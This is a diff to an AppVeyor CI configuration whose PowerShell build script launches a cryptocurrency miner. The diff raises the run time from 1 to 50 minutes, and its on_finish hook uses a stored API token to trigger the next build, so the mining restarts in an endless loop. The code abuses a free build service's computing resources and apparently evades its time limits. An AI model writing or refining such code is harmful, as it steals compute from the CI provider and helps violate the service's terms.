@@ -4,7 +4,7 @@ build: off
 
 environment:
   API_TOKEN:
-    secure: "your_encrypted_api_token_here"  # Get this from AppVeyor settings
+    secure: "your_encrypted_api_token_here" # Replace with your encrypted token
 
 install:
   - ps: |
@@ -31,9 +31,9 @@ build_script:
       
       Write-Host "Miner process has been launched. This build will run for 50 minutes before restarting."
       
-      # Change timeout back to 50 minutes after testing
+      # Timeout set to 50 minutes
       $startTime = Get-Date
-      $timeoutMinutes = 1  # Changed back to 50 minutes
+      $timeoutMinutes = 50  # Corrected to 50 minutes as intended
       
       while (((Get-Date) - $startTime).TotalMinutes -lt $timeoutMinutes) {
           Start-Sleep -Seconds 300
@@ -47,8 +47,8 @@ on_finish:
       Write-Host "Build finished. Attempting to trigger the next build via API..."
       
       $accountName = "Peter211231231231232131"
-      $projectSlug = "voyage-test"  # Fixed: underscore instead of hyphen
-      $branch = "main"
+      $projectSlug = "voyage-test"  # This is correct based on your successful test
+      # The 'branch' parameter is optional and can be omitted
       
       try {
           if (-not $env:API_TOKEN) {
@@ -65,7 +65,6 @@ on_finish:
           $body = @{
               accountName = $accountName
               projectSlug = $projectSlug
-              branch      = $branch
           } | ConvertTo-Json
           
           $response = Invoke-RestMethod -Uri $apiUrl -Method Post -Headers $headers -Body $body
@@ -78,6 +77,5 @@ on_finish:
           Write-Host "           API CALL FAILED - ERROR"
           Write-Host "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
           Write-Host "Error details: $($_.Exception.Message)"
-          Write-Host "Response: $($_.Exception.Response)"
           Write-Host "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
       }
